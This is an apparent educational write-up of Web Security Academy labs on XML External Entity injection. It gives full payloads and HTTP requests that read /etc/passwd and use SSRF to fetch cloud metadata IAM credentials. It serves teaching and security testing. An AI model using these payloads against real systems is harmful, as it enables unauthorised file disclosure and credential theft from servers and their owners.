<h1>Exploiting XML External Entity (XXE) Vulnerabilities - FOR EDUCATIONAL PURPOSES ONLY</h1>

<h2>Exploiting XXE to retrieve files</h2>

To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:

<ol>
  <li>Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.</li>
  <li>Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity</li>
</ol>

For example, a shopping application sends XML data to the server when checking the stock of grocery items.

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

To exploit the XXE and retrieve the /etc/passwd file, we must modify the XML to this:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

This XXE payload defines an external entity &xxe; whose value is the contents of the /etc/passwd file and uses the entity within the productId value.
This causes the application's response to include the contents of the /etc/passwd file

<h3>Example(s) Of Using XXE To Retrieve Files</h3>

Scenario 1: Web Application sends XML data to server to check the stock of items sold on the website. 

<img width="1260" height="348" alt="xxe-injection-stock-checker-browser" src="https://github.com/user-attachments/assets/eeb0a51f-aab5-43f7-bbf0-a8d6394d3f02" />

Below is the POST request to the /product/stock endpoint that is sent when users check the stock of an item.

```
POST /product/stock HTTP/2
Host: 0a7c00e404952062de953eee0026007c.web-security-academy.net
Cookie: session=bs0zDqdFU7IOVKqN2SN4GTPnbFXteD87
Content-Type: application/xml
Content-Length: 107

<?xml version="1.0" encoding="UTF-8"?>
  <stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
  </stockCheck>
```

If there are no defenses in place, then sending the following request will make the server reply with the content of the /etc/passwd file.

```
POST /product/stock HTTP/2
Host: 0a7c00e404952062de953eee0026007c.web-security-academy.net
Cookie: session=bs0zDqdFU7IOVKqN2SN4GTPnbFXteD87
Content-Length: 189
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

<img width="1416" height="612" alt="xxe-injection-stock-checker-read-etc-passwd-file-burpsuite" src="https://github.com/user-attachments/assets/1b4b9db5-90d5-427f-952e-1b924c341479" />


<h2>Exploiting XXE For SSRF</h2>

Aside from retrieval of sensitive data, the other main impact of XXE attacks is that they can be used to perform server-side request forgery (SSRF). This is a potentially serious vulnerability in which the server-side application can be induced to make HTTP requests to any URL that the server can access.

To exploit an XXE vulnerability to perform an SSRF attack, you need to define an external XML entity using the URL that you want to target, and use the defined entity within a data value. If you can use the defined entity within a data value that is returned in the application's response, then you will be able to view the response from the URL within the application's response, and so gain two-way interaction with the back-end system. If not, then you will only be able to perform blind SSRF attacks (which can still have critical consequences).

In the following XXE example, the external entity will cause the server to make a back-end HTTP request to an internal system within the organization's infrastructure:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

<h3>Examples Of Using XXE For SSRF</h3>

Scenario 2: Web Application sends XML data to server to check the stock of items sold on the website.

<img width="1543" height="258" alt="xxe-injection-stock-checker-browser-ssrf" src="https://github.com/user-attachments/assets/0a6b3d50-49c7-470e-8219-ebdd229a96ef" />


```
POST /product/stock HTTP/2
Host: 0a740027046c804482c9a66d00ba00b3.web-security-academy.net
Cookie: session=tNrXUoaiGqmdN2BOwoBRjRLVKUvhMgIF
User-Agent: Mozilla/5.0
Content-Type: application/xml
Content-Length: 242

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ssrf [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

<img width="1910" height="665" alt="xxe-ssrf-burpsuite" src="https://github.com/user-attachments/assets/157e98ad-6f4c-4253-968c-1028afd3371d" />

